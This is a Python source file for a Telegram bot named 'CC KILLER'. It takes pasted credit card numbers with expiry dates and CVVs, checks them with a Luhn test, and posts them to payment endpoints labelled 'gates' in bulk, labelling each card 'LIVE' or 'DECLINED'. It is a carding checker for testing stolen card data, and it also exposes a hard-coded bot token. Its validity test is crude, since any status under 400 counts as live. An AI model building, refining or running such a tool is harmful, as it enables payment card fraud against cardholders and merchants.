# NO LOHN DEPENDENCY - PURE GATE KILLER
import asyncio
import aiohttp
import re
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

BOT_TOKEN = "8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE"  # EDIT THIS
ADMIN_ID = 6751771375  # YOUR TG ID

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

FREE_GATES = [
    "https://httpbin.org/post",
    "https://api.stripe.com/v1/payment_methods",
    "https://payment.paypal.com/api/access_token",
]

class CCKiller:
    @staticmethod
    def parse_cc(line):
        line = re.sub(r'[ -]', '', line.strip())
        match = re.match(r'(\d{13,19})[^\d]*(\d{2})?[^\d]*(\d{2,4})?[^\d]*(\d{3,4})?', line)
        if match:
            num, mon, yr, cvv = match.groups()
            return f"{num}|{mon or '12'}|{yr or '28'}|{cvv or '123'}"
        return None
    
    @staticmethod
    async def kill_cc(cc_data):
        num, mon, yr, cvv = cc_data.split('|')
        
        # QUICK CHECKSUM (NO LIBRARY)
        def luhn_check(card_num):
            digits = [int(d) for d in card_num]
            odd = digits[-1::-2]
            even = digits[-2::-2]
            checksum = 0
            checksum += sum(odd)
            for d in even:
                checksum += sum(divmod(d * 2, 10))
            return checksum % 10 == 0
        
        if not luhn_check(num):
            return "💀 DIE"
        
        # HIT GATES
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone)', 'Content-Type': 'application/x-www-form-urlencoded'}
        data = f'cardNumber={num}&expMonth={mon}&expYear={yr}&cvc={cvv}&amount=100'
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(5)) as session:
                async with session.post(random.choice(FREE_GATES), data=data, headers=headers) as resp:
                    if resp.status < 400:
                        return f"🔥 LIVE ({resp.status})"
                    return f"❌ DECLINED ({resp.status})"
        except:
            return "⚠️ ERROR"

@dp.message(Command("start"))
async def start(msg):
    await msg.answer("🔥 **FREE CC KILLER** ∞\nSend CCs: `4111111111111111|12|28|123`")

@dp.message()
async def check_ccs(msg):
    lines = msg.text.split('\n')
    ccs = [CCKiller.parse_cc(line) for line in lines if CCKiller.parse_cc(line)]
    
    if not ccs:
        return await msg.answer("❌ No CCs")
    
    await msg.answer(f"🔥 Killing {len(ccs)} CCs...")
    
    semaphore = asyncio.Semaphore(10)
    async def check(cc):
        async with semaphore:
            result = await CCKiller.kill_cc(cc)
            await msg.answer(f"`{cc}` → {result}")
            await asyncio.sleep(0.3)
    
    await asyncio.gather(*(check(cc) for cc in ccs[:50]))

async def main():
    print("🔥 CC KILLER LIVE")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
